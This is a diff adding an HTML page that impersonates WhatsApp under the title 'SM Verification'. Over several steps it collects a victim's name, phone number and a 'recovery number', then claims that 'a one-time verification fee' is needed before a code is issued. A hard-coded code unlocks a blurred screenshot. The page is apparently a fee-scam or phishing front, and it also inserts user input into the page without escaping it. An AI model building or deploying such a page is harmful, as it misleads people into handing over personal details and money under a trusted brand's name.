@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>SM Verification</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #ffffff;
+      color: #333;
+      height: 100%;
+      width: 100%;
+    }
+    .container {
+      position: absolute;
+      top: 0;
+      left: 0;
+      padding: 60px 30px;
+      height: 100%;
+      width: 100%;
+      background-color: #f7f7f7;
+      display: none;
+      animation: fadeIn 0.4s ease-in-out;
+      overflow-y: auto;
+    }
+    .container.active {
+      display: block;
+    }
+    .logo {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 40px;
+    }
+    .logo img {
+      width: 80px;
+      height: 80px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 40px;
+      color: #25D366;
+      font-size: 34px;
+    }
+    input {
+      width: 100%;
+      padding: 24px;
+      margin: 20px 0;
+      border-radius: 16px;
+      border: 1px solid #ccc;
+      background: #fff;
+      color: #333;
+      font-size: 22px;
+    }
+    button {
+      width: 100%;
+      padding: 24px;
+      margin-top: 30px;
+      border: none;
+      background-color: #25D366;
+      color: #000;
+      font-weight: bold;
+      font-size: 22px;
+      border-radius: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #1ebe58;
+    }
+    .info-text {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 18px;
+      color: #777;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Page 1 -->
+  <div class="container active" id="page1">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+    </div>
+    <h2>Welcome to SM Access</h2>
+    <input type="text" id="fullname" placeholder="Full Name">
+    <input type="text" id="phone" placeholder="Phone Number">
+    <button id="next1">Generate</button>
+  </div>
+
+  <!-- Page 2 -->
+  <div class="container" id="page2">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+    </div>
+    <h2>Confirm Your Details</h2>
+    <div class="info-text" id="confirmDetails"></div>
+    <button id="next2">Confirm</button>
+  </div>
+
+  <!-- Page 3 -->
+  <div class="container" id="page3">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+    </div>
+    <h2>Recovery Number</h2>
+    <input type="text" id="recovery" placeholder="Enter number to receive code">
+    <button id="next3">Send Code</button>
+  </div>
+
+  <!-- Page 4 -->
+  <div class="container" id="page4">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
+    </div>
+    <h2>Enter Verification Code</h2>
+    <input type="text" id="codeField" placeholder="Enter Code">
+    <div class="info-text">⚠️ A one-time verification fee is required before a code can be issued.</div>
+    <div class="info-text" id="codeStatus"></div>
+    <button id="verify">Verify</button>
+  </div>
+
+  <!-- Page 5 (Blurred WhatsApp Screenshot Page) -->
+  <div class="container" id="page5" style="padding: 0;">
+    <img src="blurred.png" 
+         alt="Verification Prompt" 
+         style="width:100%; height:100vh; object-fit:cover;">
+  </div>
+
+  <script>
+    const userData = {};
+    const pages = ['page1', 'page2', 'page3', 'page4', 'page5'];
+
+    function showPage(id) {
+      pages.forEach(p => document.getElementById(p).classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+    }
+
+    document.getElementById('next1').onclick = () => {
+      const fullname = document.getElementById('fullname').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      if (!fullname || !phone) {
+        alert("Please fill in all fields.");
+        return;
+      }
+      userData.fullname = fullname;
+      userData.phone = phone;
+      document.getElementById('confirmDetails').innerHTML = `
+        <p><strong>Name:</strong> ${fullname}</p>
+        <p><strong>Phone:</strong> ${phone}</p>
+      `;
+      showPage('page2');
+    };
+
+    document.getElementById('next2').onclick = () => {
+      showPage('page3');
+    };
+
+    document.getElementById('next3').onclick = () => {
+      const recovery = document.getElementById('recovery').value.trim();
+      if (!recovery) {
+        alert("Please enter a recovery number.");
+        return;
+      }
+      userData.recovery = recovery;
+      showPage('page4');
+    };
+
+    document.getElementById('verify').onclick = () => {
+      const code = document.getElementById('codeField').value.trim();
+      const status = document.getElementById('codeStatus');
+
+      if (code === "186723") {
+        showPage('page5');
+      } else {
+        status.style.color = "red";
+        status.innerText = "❌ Invalid code. Please try again.";
+      }
+    };
+  </script>
+
+</body>
+</html>
